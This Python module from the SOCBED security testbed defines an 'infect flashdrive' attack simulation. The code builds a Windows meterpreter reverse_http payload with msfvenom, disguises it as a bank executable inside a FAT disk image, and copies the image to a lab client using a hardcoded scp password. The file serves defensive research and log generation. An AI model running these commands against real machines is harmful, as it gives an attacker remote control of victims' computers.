# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


from attacks import Attack, AttackInfo, AttackOptions


class FlashdriveEXEAttackOptions(AttackOptions):
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"
    rhost = "Target client host or IP address"

    def _set_defaults(self):
        self.lhost = "172.18.0.3"
        self.lport = "80"
        self.rhost = "192.168.56.101"


class FlashdriveEXEAttack(Attack):
    info = AttackInfo(
        name="infect_flashdrive_exe",
        description="Mounts a drive containing an infected EXE file")
    options_class = FlashdriveEXEAttackOptions
    image_path = "/root/evil_image_file.img"
    media_path = "/media/evil_image/"

    def run(self):
        cmds = [self._generate_exe_command()]
        cmds.extend(self._generate_image_commands())
        cmds.append(self._upload_image_to_client_command())
        with self.check_printed("Image file successfully sent"):
            self.exec_commands_on_target(cmds)

    def _generate_exe_command(self):
        lhost = self.options.lhost
        lport = self.options.lport
        meterpreter_script = (
        	f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost} LPORT={lport} "
        	"-a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe")
        return meterpreter_script

    def _generate_image_commands(self):
        image = self.image_path
        media = self.media_path
        return [
            f"rm -f {image}",
            f"dd if=/dev/zero of={image} bs=1024 count=0 seek=$[1024*32]",
            f"mkfs.fat {image}",
            f"mkdir {media}",
            f"mount -o loop {image} {media}",
            f"mv /root/Bank-of-Nuthington.exe {media}",
            f"umount {image}"]

    def _upload_image_to_client_command(self):
        image_path = self.image_path
        rhost = self.options.rhost
        upload_command = (
        	f"sshpass -p 'breach' scp {image_path} ssh@{rhost}:/BREACH/ "
        	"&& echo 'Image file successfully sent'")
        return upload_command
